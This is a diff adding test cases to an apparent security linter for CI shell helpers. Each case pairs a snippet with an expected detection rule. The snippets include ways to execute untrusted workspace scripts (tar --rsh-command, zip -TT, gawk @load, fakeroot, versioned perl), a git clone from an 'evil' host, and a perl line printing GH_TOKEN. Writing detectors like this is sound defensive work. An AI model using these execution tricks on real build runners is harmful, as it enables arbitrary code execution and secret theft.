@@ -28,6 +28,9 @@ t loader-npx 1 "helper-code-loader" happy.sarif "$H${FS}set -euo pipefail${FS}a$
 t loader-cargo 1 "helper-code-loader" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}cargo run --manifest-path /tmp/x"
 t wrapper-parallel 1 "helper-untrusted-exec" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}parallel git clone {} ::: evil"
 t wrapper-flock 1 "helper-untrusted-exec" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}flock /tmp/l make -C /tmp"
+# --- unmodeled wrappers (Codex P1: fakeroot/xvfb-run operands) ---
+t wrapper-fakeroot 1 "helper-untrusted-exec" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}fakeroot bash \"\${GITHUB_WORKSPACE}/evil.sh\""
+t wrapper-xvfb 1 "helper-untrusted-exec" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}xvfb-run bash \"\${GITHUB_WORKSPACE}/evil.sh\""
 
 # --- git allowlist (subcommands fetch/diff/show/merge-base; -c quotePath) ---
 t git-clone-deny 1 "helper-untrusted-exec" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}git clone https://evil/x"
@@ -64,6 +67,10 @@ t awk-redirect-tmp-fp 0 "" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}awk '
 t awk-getline-file-fp 0 "" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}awk 'BEGIN{getline x < \"/tmp/f\"}' /dev/null"
 t awk-alt-fp 0 "" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}awk '/a|b/ {print}' /dev/null"
 t awk-string-pipe-fp 0 "" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}awk '{print \"a|b\"}' /dev/null"
+# --- gawk directives (Codex P1: @include/@load operands) ---
+t awk-include 1 "helper-untrusted-exec" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}gawk '@include \"\${GITHUB_WORKSPACE}/evil.awk\"' </dev/null"
+t awk-load 1 "helper-untrusted-exec" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}gawk '@load \"\${GITHUB_WORKSPACE}/evil.so\"' </dev/null"
+t awk-directive-string-fp 0 "" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}gawk '{print \"@include\"}' /dev/null"
 
 # --- installer TOCTOU (Codex P1: post-verify tmp_bin write) ---
 t toctou-cat 1 "muse-installer-toctou" happy.sarif "$I${FS}got_sha=${FS}a${FS}cat \"\${GITHUB_WORKSPACE}/evil\" > \"\${tmp_bin}\""
@@ -107,6 +114,10 @@ t perl-env-dynamic 1 "helper-perl-danger" happy.sarif "$P${FS}use warnings;${FS}
 t perl-env-home-fp 0 "" happy.sarif "$P${FS}use warnings;${FS}a${FS}my \$h = \$ENV{HOME};"
 t perl-inline-use 1 "helper-perl-danger" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}perl -e 'use IO::Socket::INET;'"
 t perl-inline-env 1 "helper-perl-danger" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}perl -0777 -pe 'print \$ENV{GH_TOKEN};'"
+# --- versioned perl (Codex P1: perl5.38.2 dispatch) ---
+t perl-versioned 1 "helper-untrusted-exec" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}perl5.38.2 \"\${GITHUB_WORKSPACE}/evil.pl\""
+t perl-target 1 "helper-untrusted-exec" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}perl5.38-x86_64-linux-gnu \"\${GITHUB_WORKSPACE}/evil.pl\""
+t perl-perldoc-fp 0 "" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}perldoc perlrun"
 
 # --- installer tmp_bin aliases (Codex P1: replacement=$tmp_bin) ---
 t toctou-alias 1 "muse-installer-toctou" happy.sarif "$I${FS}got_sha=${FS}a${FS}replacement=\"\${tmp_bin}\"${RS}$I${FS}replacement=\"\${tmp_bin}\"${FS}a${FS}cat \"\${GITHUB_WORKSPACE}/evil\" > \"\${replacement}\""
@@ -160,6 +171,14 @@ t copy-tar-checkpoint 1 "helper-untrusted-exec" happy.sarif "$H${FS}set -euo pip
 t copy-tar-tocommand 1 "helper-untrusted-exec" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}tar -cf /tmp/x --to-command=/bin/sh /dev/null"
 t copy-tar-compress 1 "helper-untrusted-exec" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}tar -cf /tmp/x -I evil /dev/null"
 t copy-tar-plain-fp 0 "" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}tar -cf /tmp/out.tar /dev/null"
+# --- tar remote shell + implicit extraction (Codex P1s) ---
+t copy-tar-rsh 1 "helper-untrusted-exec" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}tar --rsh-command=\"\${GITHUB_WORKSPACE}/evil.sh\" -cf localhost:/tmp/x.tar /etc/hostname"
+t copy-tar-rmt 1 "helper-untrusted-exec" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}tar --rmt-command=\"\${GITHUB_WORKSPACE}/evil.sh\" -cf localhost:/tmp/x.tar /dev/null"
+t copy-tar-noC 1 "helper-workspace-write" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}tar -xf \"\${GITHUB_WORKSPACE}/evil.tar\""
+t copy-tar-C-tmp-fp 0 "" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}tar -xf \"\${GITHUB_WORKSPACE}/evil.tar\" -C \"\${RUNNER_TEMP}\""
+# --- zip test command (Codex P1: -TT executes) ---
+t copy-zip-TT 1 "helper-untrusted-exec" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}zip -q -T -TT \"bash \${GITHUB_WORKSPACE}/evil.sh\" \"\${RUNNER_TEMP}/probe.zip\" /etc/hostname"
+t copy-zip-T-fp 0 "" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}zip -q -T \"\${RUNNER_TEMP}/probe.zip\" /etc/hostname"
 t copy-sed-exec 1 "helper-untrusted-exec" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}sed 's/x/y/e' /tmp/f"
 t copy-sed-e-cmd 1 "helper-untrusted-exec" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}sed -e '/pat/e' /tmp/f"
 t copy-sed-w-trusted 1 "helper-trusted-write" happy.sarif "$H${FS}set -euo pipefail${FS}a${FS}sed 'w \${SCRIPT_DIR}/x' /tmp/f"
